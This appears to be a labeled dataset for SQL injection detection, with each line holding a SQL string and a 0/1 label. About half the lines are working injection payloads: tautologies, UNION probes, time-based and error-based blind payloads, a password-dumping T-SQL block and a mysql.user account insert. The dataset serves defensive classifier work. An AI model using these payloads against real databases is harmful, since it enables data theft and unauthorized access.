" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1";1
"UPDATE logs SET description = '2023-01-01' WHERE description = 'active';";0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--;1
"1%"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""%""  =  """;1
1  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ;1
INSERT INTO library  ( give, adventure, lips )  VALUES  ( 'could', 'happened', 'reason' )  ;0
"UPDATE customers SET price = '2023-01-01' WHERE price = '2023-01-01';";0
"-5625"" union all select 6087,6087,6087,6087,6087,6087--";1
SELECT COUNT ( properly ) FROM establish;0
SELECT * FROM friend 3 SELECT * FROM percent;0
SELECT * FROM dirty WHERE listen BETWEEN 'trick' AND 'ordinary';0
"-3829%""  )   union all select 2218,2218,2218,2218,2218,2218,2218--";1
||UTL_HTTP.REQUEST;1
select * from users where id  =  1 *1 or 1  =  1 -- 1;1
SELECT * FROM public FETCH FIRST 50 PERCENT ROWS ONLY;0
"SELECT name, status, quantity FROM products WHERE description = 'user123';";0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--;1
1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --;1
1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1";1
SELECT * FROM dry  WHERE attempt = function;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#;1
"select pg_sleep  (  5  )   and ""%""  =  """;1
SELECT * FROM industry;0
"DELETE FROM customers WHERE status = '2023-01-01';";0
or x  =  x;1
SELECT MIN ( salt )  AS court FROM parallel;0
"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#";1
INSERT INTO lips  ( good, jump, around )  VALUES  ( 'silk', 'income', 'throughout' )  ;0
UPDATE tight SET several = 'pattern'WHERE goose = 'reach';0
SELECT * FROM  ( SELECT hand FROM wore ) ;0
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'foop' like 'foop;1
"INSERT INTO logs (email, user_id, quantity, created_at) VALUES ('user123', 'pending', 'pending', '2023-01-01');";0
-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl;1
SELECT * FROM correctly WHERE NOT including = 'know'  AND NOT breathing = 'block';0
-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#;1
1'   )    )    and 6690  =  3250#;1
-5742' where 1314  =  1314 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --;1
)    )    or pg_sleep  (  __TIME__  )  --;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#;1
-7999  )   or 8422  =  1336;1
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr";1
or '7659'  =  '7659;1
select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1;1
1%'   )    )    union all select null,null,null,null#;1
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp";1
1' waitfor delay '0:0:5'--;1
1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226;1
SELECT * FROM building WHERE shallow = 'aloud' FETCH FIRST 3 ROWS ONLY;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#;1
SELECT * FROM blow WHERE draw IN  ( 'brown', 'coming', 'biggest' )  ;0
"UPDATE products SET id = 'john@example.com' WHERE quantity = 123;";0
1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738;1
SELECT doubt, sheet, music FROM former WHERE force  IS NULL;0
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ";1
SELECT * FROM arm WHERE canal = 'wagon' FETCH FIRST 3 ROWS ONLY;0
SELECT AVG ( drink ) FROM century;0
SELECT * FROM walk WHERE sudden LIKE '%serious%';0
SELECT MIN ( while )  AS excited FROM whole;0
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ';1
"DELETE FROM inventory WHERE status = 'active';";0
SELECT * FROM recently 3 SELECT * FROM excellent;0
-6045 or 8919  =  2827--;1
SELECT * FROM prize 3;0
"1%""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """;1
-5580 or 4829  =  1968;1
" select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1";1
"""   )    )   ;waitfor delay '0:0:__TIME__'--";1
select * from users where id  =  1 union select @ $_,version  (    )   -- 1;1
"1""  )   as paai where 4089  =  4089 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
SELECT * FROM both WHERE using IN  ( 'wheel', 'society', 'instance' )  ;0
"1%"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and ""%""  =  """;1
1'  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  'gfxr'  =  'gfxr;1
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805;1
1'||  (  select 'rask' from dual where 9411  =  9411 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||';1
INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose )  VALUES  ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )  ;0
insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ;1
1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg;1
"DELETE FROM logs WHERE email = 'user123';";0
SELECT adjective ( s )  FROM short FULL OUTER JOIN;0
ORDER BY 27--;1
SELECT suppose ( s ) FROM rose INNER JOIN;0
1 where 3354  =  3354;1
1 rlike   (  select   (  case when   (  6795  =  5898  )   then 1 else 0x28 end   )    )   -- xdkx;1
"1""  )   where 2602  =  2602 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#;1
/*  	C-style comment;1
(  1589  =  1589  )  *1;1
1' where 4460  =  4460;1
select count  (  *  )   from generate_series  (  1,5000000  )  --;1
-5134   )    )     )   or 8571  =  8571--;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17;1
"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
SELECT * FROM shoe FETCH FIRST 50 PERCENT ROWS ONLY;0
1'||  (  select 'aioq' from dual where 8176  =  8176;1
1   )    )     )   and sleep  (  5  )   and    (    (     (  6618  =  6618;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#;1
"1%""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --";1
SELECT * FROM thus;0
SELECT AVG ( into ) FROM stepped SELECT SUM ( worry ) ;0
1'+  (  select taga where 8036  =  8036;1
SELECT TOP 50 PERCENT * FROM magnet;0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--;1
"UPDATE sessions SET user_id = 123 WHERE description = 456;";0
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg";1
"INSERT INTO sessions (email, description) VALUES ('Sample text', 'john@example.com');";0
"UPDATE products SET price = 'user123' WHERE name = 456;";0
1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --;1
AS INJECTX WHERE 1=1 AND 1=0;1
-9358' or 9887  =  2569--;1
select case when 7951  =  1147 then 1 else null end--;1
-9840'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'dzlp'  =  'dzlp;1
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """;1
-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--;1
DELETE FROM sick;0
1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  ';1
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  'vfxg' like 'vfxg;1
1  )   where 4710  =  4710 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --;1
SELECT Employees.individual, COUNT ( Orders.sourceID )  AS lionFROM    ( OrdersINNER JOIN coal ON Orders.giantID  =  Employees.chiefID ) ;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i;1
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'prjf'  =  'prjf;1
1'+  (  select ounb where 4653  =  4653 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +';1
SELECT * FROM better WHERE gave = 'slipped';0
SELECT DISTINCT free FROM them;0
SELECT Employees.frog, COUNT ( Orders.instantID )  AS catFROM    ( OrdersINNER JOIN refused ON Orders.stillID  =  Employees.medicineID ) ;0
select   (  case when   (  5970  =  2200  )   then 1 else 5970*  (  select 5970 from master..sysdatabases  )   end  )  --;1
"1""   )    )    as tmpz where 7224  =  7224 and make_set  (  3579  =  1045,1045  )  --";1
SELECT mouse, desk, bat FROM apartment WHERE late  IS NULL;0
SELECT * FROM birthday 3 SELECT * FROM impossible;0
SELECT * FROM parallel FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM upper;0
-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#;1
SELECT * FROM character FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM planet;0
SELECT happily AS prove, rule AS [cat]  FROM straw;0
SELECT * FROM should WHERE test IN  ( SELECT pig FROM exclaimed ) ;0
"SELECT name, quantity, id FROM logs WHERE price = 456;";0
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # lchh;1
1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb;1
"INSERT INTO customers (price, quantity, name, status) VALUES ('2023-01-01', 'john@example.com', '2023-01-01', 456);";0
"1%""   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --";1
"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb";1
UPDATE duty SET pocket = 'closely'WHERE product = 'press';0
1' GROUP BY 1,2,3--+;1
"INSERT INTO products (price, id, email) VALUES ('2023-01-01', 'Sample text', 'active');";0
SELECT * FROM average ORDER BY sure, find;0
-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#;1
"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --";1
1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw;1
-3861'  )   as zmja where 4036  =  4036 or 9323  =  9323#;1
select * from users where id  =  1.* union select null,@@VERSION -- 1;1
SELECT * FROM discover  WHERE every = married;0
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1";1
"1""  )   where 6897  =  6897";1
ORDER BY 3--;1
/;1
union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --;1
SELECT street ( s )  FROM pupil SELECT concerned ( s ) ;0
SELECT * FROM fell WHERE engineer NOT LIKE '[basket]%';0
1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ;1
"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--";1
"1""   )    )    as hkrh where 3060  =  3060 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --";1
select * from users where id  =  1 <@. union select 1,version  (    )   -- 1;1
select * from users where id  =  1 union select @<@,version  (    )   -- 1;1
admin' or 1=1;1
-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--;1
') or pg_sleep(5)--;1
DELETE FROM grandmother;0
"-9440"" union all select 5599,5599,5599,5599,5599--";1
-2;1
1'  )   where 9272  =  9272;1
admin'  )   or '1'  =  '1;1
SELECT Count ( * )  AS growth;0
"SELECT name, created_at, id FROM orders WHERE description = 'user123';";0
"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--";1
1%'   )    )     )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  ';1
ORDER BY 11;1
SELECT * FROM forgotten WHERE would = 'month';0
SELECT AVG ( harbor ) FROM sad SELECT SUM ( question ) ;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#;1
1'  )   where 2090  =  2090;1
1'  )   where 5378  =  5378;1
1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ;1
select case when 5559  =  3483 then 1 else null end--;1
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1";1
"SELECT id FROM orders WHERE status = 123;";0
""") or sleep(5)=""";1
SLEEP(5)#;1
SELECT sentence ( s FROM top RIGHT JOIN;0
1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--;1
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl";1
SELECT scientific ( s )  FROM term UNION ALL;0
"-3347%"" or 9323  =  9323#";1
PRINT @@variable;1
"; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >";1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  ';1
SELECT * FROM fix WHERE powder BETWEEN '1996-07-01' AND '1996-07-31';0
1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #;1
"DELETE FROM employees WHERE user_id = '2023-01-01';";0
SELECT * FROM solve;0
ORDER BY 30--;1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1";1
SELECT AVG ( similar ) FROM cutting;0
or 1  =  1--;1
SELECT * FROM surrounded FETCH FIRST 50 PERCENT ROWS ONLY;0
1' where 4388  =  4388;1
"INSERT INTO users (id, price) VALUES ('Sample text', 'Sample text');";0
ORDER BY 25#;1
-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--;1
SELECT especially FROM hello UNION SELECT composition FROM environment ORDER BY block;0
"SELECT description, status, user_id FROM employees WHERE name = '2023-01-01';";0
1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#;1
1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --;1
1'   )    )     )   and sleep  (  5  )  #;1
"DELETE FROM users WHERE id = 'user123';";0
SELECT * FROM strike FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM breathe;0
UPDATE case SET answer =  'cheese', City =  'party' WHERE social =  cannot;0
1,exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ;1
-2891 where 1770  =  1770 or 9290  =  5866;1
1   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   9270  =  9270;1
"UPDATE sessions SET description = 456 WHERE user_id = 'user123';";0
SELECT * FROM pen WHERE complex = 'satisfied'  AND City = 'soldier';0
SELECT COUNT ( table ) FROM location;0
"1"" where 8333  =  8333";1
SELECT * FROM course FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM season;0
SELECT * FROM bat WHERE NOT pictured = 'log'  AND NOT yet = 'citizen';0
"SELECT id, quantity, price, email FROM customers WHERE name = 'pending';";0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#;1
"select sleep  (  5  )   and    (    (     (  ""%""  =  """;1
1'  )   where 7561  =  7561 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --;1
SELECT * FROM immediately WHERE face = 'home'  OR death = 'class';0
1%'   )    )    union all select null,null,null,null,null,null,null,null,null--;1
"UPDATE orders SET price = 'user123' WHERE user_id = 'user123';";0
SELECT bow ( s )  FROM expect FULL OUTER JOIN;0
SELECT are AS face, stretch AS [steel]  FROM too;0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--;1
SELECT Count ( * )  AS official;0
SELECT * FROM strike  WHERE sun NOT LIKE '[source]%';0
SELECT COUNT ( DISTINCT corner )  FROM finish;0
"1""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
"SELECT email FROM sessions WHERE price = 'active';";0
SELECT * FROM letter WHERE Price NOT BETWEEN 10 AND 20;0
"1""  )   as tnux where 4888  =  4888 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #";1
1'   )    )    or sleep  (  5  )  #;1
select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240;1
"INSERT INTO sessions (price, email) VALUES ('2023-01-01', 'john@example.com');";0
SELECT MIN ( standard )  AS movie FROM smaller;0
"SELECT created_at, price, id, quantity FROM sessions WHERE user_id = 'active';";0
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--;1
1'+  (  select 'unpz' where 8186  =  8186;1
1' where 9156  =  9156 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
-7423 or make_set  (  9354  =  9354,7185  )  -- hprc;1
1'||  (  select 'goxu' where 9215  =  9215 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#";1
1 exec sp_   (  or exec xp_  ) ;1
"-9439""  )   where 9460  =  9460 or   (  9497  =  9586  )  *9586--";1
SELECT * FROM jet WHERE substance BETWEEN '1996-07-01' AND '1996-07-31';0
1'||  (  select 'gved' from dual where 6965  =  6965;1
1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062;1
select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1;1
"1""   )    )    as daqd where 4390  =  4390 and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
